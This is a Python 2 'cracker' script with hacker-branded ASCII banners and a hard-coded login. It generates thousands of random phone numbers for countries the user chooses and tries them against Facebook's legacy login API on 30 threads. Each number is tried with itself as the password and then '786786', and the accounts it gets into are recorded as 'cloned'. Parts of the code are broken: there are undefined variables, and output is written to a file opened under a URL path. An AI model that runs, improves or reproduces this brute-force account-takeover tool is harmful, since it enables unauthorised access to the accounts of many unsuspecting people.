#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(4500):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 cracker.py')

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animasi-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)
	
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
#### logo ####
logo='''
\033[1;95m┏┓︱┏┓︱︱︱︱┏┳┓︱︱︱︱︱︱︱︱┏┓︱︱︱︱ \033[1;96m ︱┏┓︱︱︱︱︱︱︱︱
\033[1;95m┃┗┓┣┫┏━┳┓┃┃┃┏━┓︱┏━━┓┣┫┏━┳┓  \033[1;96m︱┣┫┏━┓︱┏━┳┓
\033[1;95m┃╋┃┃┃┃┃┃┃┣┓┃┃╋┗┓┃┃┃┃┃┃┃┃┃┃ \033[1;96m┏┛┃┃╋┗┓┃┃┃┃
\033[1;95m┗━┛┗┛┗┻━┛┗━┛┗━━┛┗┻┻┛┗┛┗┻━┛ \033[1;96m┗━┛┗━━┛┗┻━┛
\033[1;92m--------------------------------------------------
\033[1;97m➣ Author   : Edris Nabizada 
\033[1;97m➣ Youtube   : Search On Youtube Best Hacker 
\033[1;97m➣ Telegram  : @Best_Hacker00420 
\033[1;92m--------------------------------------------------
                                ''' 
logo2='''
\033[1;94m                      :::!~!!!!!:.
\033[1;93m                  .xUHWH!! !!?M88WHX:.
\033[1;94m                .X*#M@$!!  !X!M$$$$$$WWx:.
\033[1;93m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
\033[1;94m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
\033[1;93m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
\033[1;94m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
\033[1;93m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
\033[1;94m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
\033[1;93m             :X- M$$$$       `"T#$T~!8$WUXU~
\033[1;94m            :%`  ~#$$$m:        ~!~ ?$$$$$$
\033[1;93m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
\033[1;94m.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
\033[1;93mW$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
\033[1;94m#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
\033[1;93m:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
\033[1;94m.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
\033[1;93mWi.~!X$?!-~    : ?$$$B$Wu("**$RM!
\033[1;94m$R@i.~~ !     :   ~$$$$$B$$en:``
\033[1;93m?MXT@Wx.~    :     ~"##*$$$$M~
\033[1;92m--------------------------------------------------
\033[1;97m➣ Author   : Edris Nabizada 
\033[1;97m➣ Youtube   : Search On Youtube Best Hacker
\033[1;97m➣ Telegram  : @Best_Hacker00420 
\033[1;92m--------------------------------------------------
                                '''
CorrectUsername = "mazar"
CorrectPassword = "hack"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \033[1;91mUSERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \033[1;91mPASSWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:AMiR BabeR
            loop = 'false'
        else:
            print "Serious Please"
            os.system('xdg-open https://www.youtube.com/channel/UCUuLWMHEyrtIRxAS1HR45uw')
    else:
        print "Wrong Dear!"
        os.system('xdg-open https://www.youtube.com/channel/UCUuLWMHEyrtIRxAS1HR45uw')

####login#########                                
logo3='''
\033[1;96m        _______        \033[1;93m        _______    
\033[1;96m    .adOOOOOOOOOba.    \033[1;93m     .adOOOOOOOOOba.
\033[1;96m   dOOOOOOOOOOOOOOOb   \033[1;93m    dOOOOOOOOOOOOOOOb 
\033[1;96m  dOOOOOOOOOOOOOOOOOb  \033[1;93m   dOOOOOOOOOOOOOOOOOb
\033[1;96m dOOOOOOOOOOOOOOOOOOOb \033[1;93m  dOOOOOOOOOOOOOOOOOOOb
\033[1;96m|OOOOOOOOOOOOOOOOOOOOO|\033[1;93m |OOOOOOOOOOOOOOOOOOOOO|
\033[1;96mOP'~"YOOOOOOOOOOOP"~`YO\033[1;93m OP'~"YOOOOOOOOOOOP"~`YO
\033[1;96mOO     `YOOOOOP'     OO\033[1;93m OO     `YOOOOOP'     OO 
\033[1;96mOOb   ●  `OOO'  ●   dO\033[1;93m  OOb   ●  `OOO'  ●   dO
\033[1;96mYOOo      OOO      oOOP\033[1;93m YOOo      OOO      oOOP
\033[1;96m`OOOo     OOO     oOOO'\033[1;93m `OOOo     OOO     oOOO'
\033[1;96m `OOOb._,dOOOb._,dOOO' \033[1;93m  `OOOb._,dOOOb._,dOOO'
\033[1;96m  `OOOOOOOOOOOOOOOOO'  \033[1;93m   `OOOOOOOOOOOOOOOOO'
\033[1;96m   OOOOOOOoOoOOOOOOO   \033[1;93m    OOOOOOOoOoOOOOOOO 
\033[1;96m   YOOOOOOOOOOOOOOOP   \033[1;93m    YOOOOOOOOOOOOOOOP
\033[1;96m   `OOOOOI```IOOOOO'   \033[1;93m    `OOOOOI```IOOOOO'
\033[1;96m    `OOOOI,,,IOOOO'    \033[1;93m     `OOOOI,,,IOOOO'   
\033[1;96m     `OOOOOOOOOOO'     \033[1;93m      `OOOOOOOOOOO'         
\033[1;92m--------------------------------------------------
\033[1;97m➣ Author   : Edris Nabizada
\033[1;97m➣ Youtube  :Search On youtube Best Hacker 
\033[1;97m➣ Telegram  : @Best_Hacker00420
\033[1;92m--------------------------------------------------
                                '''                                
logo4='''
\033[1;93m                                                                  _
\033[1;94m                                                              _( (~\
\033[1;93m       _ _                        /                          ( \> > \
\033[1;94m   -/~/ / ~\                     :;                \       _  > /(~\/
\033[1;93m  || | | /\ ;\                   |l      _____     |;     ( \/    > >
\033[1;94m  _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
\033[1;93m ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
\033[1;94m(((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
\033[1;93m)))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
\033[1;94m((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
\033[1;93m )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
\033[1;94m |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
\033[1;93m |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
\033[1;94m ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
\033[1;93m   ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
\033[1;94m      ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
\033[1;93m :       ;                     `.      "``::::::''    .'
\033[1;94m    ;                           `.   \_              /
\033[1;93m  ;       ;                       +:   ~~--  `:'  -';
\033[1;94m                                   `:         : .::/
\033[1;93m      ;                            ;;+_  :::. :..;;;
 \033[1;94m                                  ;;;;;;,;;;;;;;;,;
\033[1;92m--------------------------------------------------
\033[1;97m➣ Author   : Edris Nabizada
\033[1;97m➣ Youtube   : Search On Youtube Best Hacker
\033[1;97m➣ Telegram  : @Best_Hacker00420
\033[1;92m--------------------------------------------------
                                '''                                
                               
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    menu()
####INI MENU TOOLS ####
def menu():
	os.system('clear')
	print logo
	print "\033[1;97m--------------------------------------------------\n"
	print '\033[1;93m[1]\033[1;97m  India'
	print '\033[1;93m[2]\033[1;97m  Pakistan'
	print '\033[1;93m[3]\033[1;97m  Bangladesh'
	print '\033[1;93m[4]\033[1;97m  Afghanistan'
	print '\033[1;93m[5]\033[1;97m  Indonesia '
	print '\033[1;93m[6]\033[1;97m  Japan '
	print '\033[1;93m[7]\033[1;97m  Denmark'
	print '\n\033[1;97m[0]  Exit'
	print "\033[1;97m--------------------------------------------------\n"
	action()

def action():
    peak = raw_input('\n\033[0;98mChoose an Option : \033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[1;97m620,630,700,786,905,954,967,971,990,991,992,993,994,995,996,997,998,999")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+91"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="2":              
        os.system("clear")
        print logo3
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[1;97m01,49")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="3":              
        os.system("clear")
        print logo4
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[1;97m175,165,191,192,193,194,195,196,197,198,199")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="4":              
        os.system("clear")
        print logo2
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[1;97m20,27,30,31,40,50,58,60")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+930"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="5":              
        os.system("clear")
        print logo
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[36, 77, 229, 770, 23, 230, 9")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+62"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="6":              
        os.system("clear")
        print logo3
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[2")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+850"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =="7":              
        os.system("clear")
        print logo2
        print("\033[1;92mArea Codes With Network")+'\n'
        print("\033[820,887, 830")+'\n'
        try:
            c = raw_input("\033[1;92mChoose Area Code : ")
            k="+45"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif peak =='0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    print ('[✓] Total Numbers: '+xxx)
    time.sleep(0.5)
    print ("[✓] Trying Passwords Wait...")
    time.sleep(0.5)
    print ('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;97m--------------------------------------------------"
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('techabm')
        except OSError:
            pass
        try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;92m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user + '  |  ' + pass1
				okb = open('https://youtu.be/OJb1gO7KMrc', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass1
					cps = open('https://youtu.be/OJb1gO7KMrc', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\033[1;92m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user +  '  |  ' + pass2
 				        okb = open('https://youtu.be/OJb1gO7KMrc', 'a')
 				        okb.write(k+c+user+'|'+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass2
 					        cps = open('https://youtu.be/OJb1gO7KMrc', 'a')
 					        cps.write(k+c+user+'|'+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)

                    
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;97m--------------------------------------------------"
    print '[✓] Process Has Been Completed ...'
    print '[✓] Total Successfully/Checkpoint : '+str(len(oks))+'/'+str(len(cpb))
    print('[✓] Cloned Accounts Has Been Saved : binyamin/clone.txt') 
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;95m]")
    print "\033[1;97m--------------------------------------------------"
    menu() 
          
if __name__ == '__main__':
    menu()